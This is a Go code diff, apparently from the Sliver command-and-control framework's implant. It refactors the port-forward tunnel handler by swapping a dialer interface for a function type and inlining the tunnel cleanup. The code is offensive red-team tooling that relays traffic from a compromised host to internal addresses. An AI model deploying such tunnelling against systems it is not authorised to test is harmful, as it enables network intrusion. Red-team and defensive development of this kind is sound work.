@@ -24,7 +24,6 @@ import (
 	"io"
 	"net"
 	"strconv"
-	"sync"
 	"time"
 
 	// {{if .Config.Debug}}
@@ -40,16 +39,14 @@ import (
 
 const portfwdDialTimeout = 30 * time.Second
 
-type portfwdContextDialer interface {
-	DialContext(context.Context, string, string) (net.Conn, error)
-}
+type portfwdDialFunc func(context.Context, string, string) (net.Conn, error)
 
 // PortfwdReqHandler opens and registers one server-requested forward tunnel.
 func PortfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
-	handlePortfwdReq(envelope, connection, new(net.Dialer), portfwdDialTimeout)
+	handlePortfwdReq(envelope, connection, new(net.Dialer).DialContext, portfwdDialTimeout)
 }
 
-func handlePortfwdReq(envelope *sliverpb.Envelope, connection *transports.Connection, dialer portfwdContextDialer, dialTimeout time.Duration) {
+func handlePortfwdReq(envelope *sliverpb.Envelope, connection *transports.Connection, dial portfwdDialFunc, dialTimeout time.Duration) {
 	portfwdReq := &sliverpb.PortfwdReq{}
 	err := proto.Unmarshal(envelope.Data, portfwdReq)
 	if err != nil {
@@ -77,7 +74,7 @@ func handlePortfwdReq(envelope *sliverpb.Envelope, connection *transports.Connec
 	log.Printf("[portfwd] Dialing -> %s", remoteAddress)
 	// {{end}}
 
-	dst, err := dialer.DialContext(pending.Context(), "tcp", remoteAddress)
+	dst, err := dial(pending.Context(), "tcp", remoteAddress)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[portfwd] Failed to dial remote address %s", err)
@@ -141,16 +138,6 @@ func handlePortfwdReq(envelope *sliverpb.Envelope, connection *transports.Connec
 		return
 	}
 
-	once := sync.Once{}
-	cleanup := func(reason error) {
-		once.Do(func() {
-			// {{if .Config.Debug}}
-			log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
-			// {{end}}
-			connection.CloseTunnelLocal(tunnel)
-		})
-	}
-
 	go func() {
 		tWriter := tunnelWriter{
 			tun:  tunnel,
@@ -159,11 +146,15 @@ func handlePortfwdReq(envelope *sliverpb.Envelope, connection *transports.Connec
 		// portfwd only uses one reader, hence the tunnel.Readers[0]
 		n, err := io.Copy(tWriter, tunnel.Readers[0])
 		_ = n // avoid not used compiler error if debug mode is disabled
+		_ = err
 		// {{if .Config.Debug}}
 		log.Printf("[tunnel] Tunnel done, wrote %v bytes", n)
 		// {{end}}
 
-		cleanup(err)
+		// {{if .Config.Debug}}
+		log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, err)
+		// {{end}}
+		connection.CloseTunnelLocal(tunnel)
 	}()
 }
 
